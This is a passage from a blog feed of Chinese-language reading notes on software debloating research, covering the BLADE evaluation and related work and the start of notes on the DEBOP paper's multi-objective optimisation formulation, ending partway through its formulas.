52%</li><li>Debop 4%<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_10.png" alt="ROP Gadgets"></li></ul></li><li><ol start="2"><li>内存泄漏:使用名为Saber [14]的静态分析工具评估给定程序的内存泄漏</li></ol><ul><li>BLADE和Chisel处理内存泄漏能力是相当的,某些情况下BLADE引入了新的泄漏,这是因为BLADE的适应性检查其使用Clang的静态分析其,存在漏检情况<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_11.png" alt="内存泄漏"></li></ul></li><li><ol start="3"><li>CVEs:Common Vulnerabilities and Exposures:是特定程序已知的漏洞,这些漏洞被识别然后与公众分享</li></ol><ul><li>BLADE在9个中删了5个,与Chisel相同</li><li>Razor从9个中删了4个</li></ul></li></ul></li></ul><h4 id="h-%E9%80%9A%E7%94%A8%E6%80%A7%E8%AF%84%E4%BC%B0" tabindex="-1">H 通用性评估</h4><ul><li><p>程序相对于给定功能的通用性定义为程序处理指定功能/在精简后保留的参数的一般输入范围的能力。</p><ul><li>例如:bzip2对于-fc参数,为了测试通用性，我们为每个目标程序设计了一组新的测试用例，这些测试用例不属于功能检查器的预定义测试用例. 结果如下<img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_12.png" alt="通用性"></li></ul></li><li><p><strong>通用性和训练用例的数量</strong>:下图展示了训练用例数量和验证集数量之间的关系<img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_13.png" alt="通用性和训练用例的数量"></p><ul><li>其粗略表明:随着训练用例数量的增加,通用性也会增加</li><li>对于多样化输入的程序,需要更多的训练用例以保证通用性</li></ul></li><li><p>总结:BLADE的通用性与SOTA相当,并且可以增加训练集进一步增强通用性</p></li></ul><h4 id="%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5%3A%E5%AF%B9%E5%A4%A7%E5%9E%8B%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E7%B2%BE%E7%AE%80" tabindex="-1">更进一步:对大型应用进行精简</h4><ul><li><p>两个大的:nginx:76k 行,sqlite3-manager 75k 行</p></li><li><p>两个中的:tar 31k,make 27k</p></li><li><p>效果如下<img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_14.png" alt></p></li><li><p><strong>现有方法在大型应用上</strong>:</p><ul><li>DEBOP表现不好,在大程序上不用</li><li>Chisel在24h内无法完成简化,且在简化中出现错误</li><li>Razor不是基于源代码的,我们没有再次耗费太多精力</li></ul></li><li><p><strong>nginx</strong>:</p><ul><li>选择原因:(1)大程序(2)CVE中的漏洞</li><li>BLADE移除了6个CVE,因为简化删除了易受攻击的功能</li><li>对简化后的二进制文件进行通用性测试,托管了20个不同的html界面,18个运行成功</li></ul></li><li><p><strong>sqlite3-manager</strong>:因其大程序,可解释如何通过移除功能增加安全性(移除update和delete可去除SQL注入)</p></li></ul><h3 id="5-%E8%AE%A8%E8%AE%BA" tabindex="-1">5 讨论</h3><ul><li><strong>通用性和训练样例</strong><ul><li>BLADE的通用性与训练样例的全面性有关</li><li>然而蚕蛹少量训练数据达到更好通用性仍是一个开放问题</li></ul></li><li><strong>编程语言</strong><ul><li>目前BLADE面向C/C++程序,但理论上可以面向任何 先定义后使用 的结构,然而原始的DD确实可以应用于所有程序</li><li>为了应对更广泛的语言,BLADE可以以LLVM IR为输入,这是一种中间代码,任何语言编写的程序都可以首先编译为LLVM IR的形式,然后使用BLADE简化啊</li></ul></li></ul><h3 id="6-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">6 相关工作</h3><ul><li><strong>基于源代码的简化器</strong>:<ul><li>有很多 :C-reduce [8], Perses [9],Chisel [1], Debop [7], DomGad [25], and Cov-A/F [26]</li><li>大部分使用了Delta Debugging (DD) algorithm [10]:该算法最初是为了确定在程序中起作用的“昨天”（工作模板程序）但在“今天”（错误程序）不起作用的最小故障诱导代码. DD就是发现有问题的代码,然后去掉这些代码将是程序正确;这与代码简化有着相似的原理<ul><li>基于DD,C-reduce[8] 对源代码应用一系列变换（更改标识符、变量范围、合并定义和用函数体替换函数调用）以减小源代码. 这不仅费时间,也不可行,且代码难以审计. 而BLADE很快,同时保持源代码的可审计行和可读性</li><li>基于DD,语法指导的方法Perse[9],利用语言的语法减少了无效输出,但仍然会超时,而BLADE为线性算法</li><li>Chisel(被认为是SOTA),基于强化学习优化DD,而BLADE平均比其块2.3倍</li></ul></li><li>上述方法都基于DD,而BLADE不基于DD,而是用新的算法选择候选集,进行简化;</li><li>DomGad和Debop使用随即优化消除对DD的依赖,实现简化和通用性之间的权衡</li><li>而BLADE侧重速度,这反过来促进更多的训练数据来实现高通用性,这种高速可以应用于实际工作负载</li><li>[26]也提出了使用模糊测试和静态分析方法来阻止输入过拟合,相同的方法也可以应用于BLADE来强化训练数据</li></ul></li><li><strong>基于 IR和 binary 的简化器</strong><ul><li>JShrink[27] 对Java字节码 构造静态和动态的扩展调用图 来及逆行转化</li><li>J-Reduce[28] 使用DD有效减少Java字节码</li><li>Trimmer[5]和OCCAM[4]基于IR,使用如输入特化、循环展开和常量传播等技术，在程序的LLVM IR [24]上执行减小</li><li>RAZOR[2]在二进制可执行文件上进行简化</li><li>上述方法的主要缺点就是不支持可审计性</li></ul></li><li><strong>基于库的简化</strong><ul><li>Nibber[6] 通过删除共享库中未使用的函数来简化的放啊</li><li>PieceWise[29] 针对 共享库和静态库的代码,识别模块间的依赖关系并删除它们之间未使用的代码</li><li>这类技术是见解的,可以和BLADE和其它基于源码码的简化技术结合使用</li></ul></li><li><strong>杂项</strong><ul><li>一系列工作在不同的起点进行简化[30]-[40] (如JS,浏览器,app,配置文件)</li><li>有一项工作对简化进行了比较[41]</li></ul></li></ul><h3 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h3><ul><li>我们提出了BLADE简化框架,利用程序语言的结构实现更高效的简化,使其可以应用于大的程序上</li><li>它满足了一个有效的减小工具所设定的所有目标（减小代码大小和攻击面，快速减小，维护正确性以及可审计性）</li><li>与先前方法相比,我们BLADE在大的程序负载上有了很大的提升</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (5)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(5)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(5)/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(5)_x.png" alt></p><h2 id="debop%3Aprogram-debloating-via-stochastic-optimization" tabindex="-1">DEBOP:Program Debloating via Stochastic Optimization</h2><p>ICSE-NIER’20, May 23–29, 2020, Seoul, Republic of Korea<br>CCF A会</p><p>Q. Xin, M. Kim, Q. Zhang, and A. Orso, “Program debloating via stochastic optimization,” in Proceedings of the ACM/IEEE 42nd International Conference on Software Engineering: New Ideas and Emerging Results, ICSE-NIER ’20, (New York, NY, USA), p. 65–68, Association</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li><p>Debloating的定义</p></li><li><p>我们确信程序debloating是一个多方面的问题,必须用更通用的方法解决. 基于此,我们提出了一种通用的方法,可以将程序去膨胀问题形式化为一个多目标优化问题(multi-objective optimization problem, MOP),并使用随机优化算法来解决它.</p></li><li><p>给定一个需要简化的程序,我们需要用户指定</p><ul><li><ol><li>程序的使用情况(例如:一组带有相关使用概率的输入)</li></ol></li><li><ol start="2"><li>去膨胀关注的因素</li></ol></li><li><ol start="3"><li>这些因素的相对重要性</li></ol></li></ul></li><li><p>基于以上信息,该方法定义了一个合适的目标函数,用于将分数非陪给每个可能的简化程序,并生成最大化目标函数的解决方案</p></li><li><p>我们同时提出和评估了DEBOP:我们方法的一个具体实例,考虑了 大小减小,攻击面减小和通用性三个方面</p></li><li><p>结果现实,尽管仍然是初步的(albeit still preliminary),表明我们的方法可以有效地生成实现不同去膨胀目标之间良好权衡的去膨胀程序</p></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>去膨胀有很多目标,且目标间可能冲突,例如</p><ul><li>失败10%的输入,但减少了80%的漏洞,这是可以接受的</li><li>当通用性更重要时,程序大小的减小程度可以牺牲</li></ul></li><li><p>因此我们提出了一种新的,通用的程序去膨胀方法,将其视为多目标优化问题</p></li><li><p>我们方法根据以下元素指定简化任务</p><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 需要简化的程序</li><li>一组带有使用概率的输入(即使用情况)</li><li>去膨胀任务关注的因素</li><li>这些因素的相对重要性,用权重表示</li></ul></li><li><p>基于以上信息,该方法生成一个目标函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq> ,方法使用 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq> 来聘雇搜索出的简化程序的分数,最终需要最大化 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq></p></li><li><p>我们同时介绍了DEBOP,为我们方法的一个具体实例,考虑了三个去膨胀目标</p><ul><li><ol><li>程序大小减小</li></ol></li><li><ol start="2"><li>程序攻击面减小</li></ol></li><li><ol start="3"><li>程序通用性</li></ol></li></ul></li><li><p>除此外,DEBOP也接受三个目标的权重,以此重定义 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq></p></li><li><p>我们使用MCMC(Markov Chain Monte Carlo 马尔可夫蒙特卡洛)技术来 有效地探索解空间,MCMC在函数 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi></mrow><annotation encoding="application/x-tex">O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span></span></span></span></eq> 的指导下,对 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 的简化版本进行采样,并报告具有最佳值得版本,这个过程我们称为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi>d</mi><mi>e</mi><mi>b</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_{deb}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">e</span><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> , 其是实际解得近似值</p></li><li><p>评估,在ChiselBenchmark</p><ul><li>在多目标权衡上表现不错,同时与另一个方法进行比较</li><li>DEBOP可能通用性不佳,但会产生更好得整体效果</li></ul></li><li><p>本文贡献如下</p><ul><li><ol><li>一个新的通用的简化程序形式化方法,将其视为多目标优化问题</li></ol></li><li><ol start="2"><li>一个具体的实例DEBOP,用于简化程序,并在多个目标之间进行权衡</li></ol></li><li><ol start="3"><li>一个概念验证聘雇,展示我们方法的潜在用途,并提供了对程序简化中权衡的新见解</li></ol></li><li><ol start="4"><li><a href="https://sites.google.com/view/debop19">DEBOP开源</a></li></ol></li></ul></li></ul><h3 id="2-%E8%83%8C%E6%99%AF" tabindex="-1">2 背景</h3><ul><li>Debloating定义</li><li>程序表示</li></ul><h3 id="3-%E6%96%B9%E6%B3%95debop" tabindex="-1">3 方法DEBOP</h3><ul><li><p>DEBOP</p><ul><li>支持三个目标:程序大小减小,程序攻击面减小,程序通用性</li><li>通过MCMC取样技术,在优化问题上取得近似解</li></ul></li><li><p>形式化描述</p><ul><li>一个简化程序的版本 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>∈</mo><mi>S</mi><mi>u</mi><mi>b</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p&#x27;\in Sub(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq></li><li>size reduction: <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>r</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>s</mi><mi>z</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>−</mo><mi>s</mi><mi>z</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi>s</mi><mi>z</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">sr(p,p&#x27;)=\frac{sz(p)-sz(p&#x27;)}{sz(p)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">sr</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.5845em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0645em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">sz</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.04398em;">sz</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.04398em;">sz</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>z</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">sz(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">sz</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq>是程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 的大小,如代码行数</li><li>attack surface reduction: <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>r</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>a</mi><mi>s</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>−</mo><mi>a</mi><mi>s</mi><mo stretchy="false">(</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi>a</mi><mi>s</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">ar(p,p&#x27;)=\frac{as(p)-as(p&#x27;)}{as(p)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.5845em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0645em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight">s</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>s</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">as(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></eq>是程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq> 的攻击面数量,如 gadget数量</li><li>generality: <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo><mo>=</mo><msub><mo>∑</mo><mrow><msub><mi>i</mi><mi>k</mi></msub><mo>∈</mo><mi>I</mi></mrow></msub><mi>p</mi><msub><mi>r</mi><mi>k</mi></msub><mi>T</mi><mo stretchy="false">(</mo><msub><mi>i</mi><mi>k</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">g(p,p&#x27;)=\sum_{i_k\in I} pr_kT(i_k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1556em;vertical-align:-0.4056em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1786em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.4056em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">i</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq>, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq> 是一组输入, <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><msub><mi>r</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">pr_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq> 是输入 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>i</mi><mi>k</mi></msub></mrow><annotation 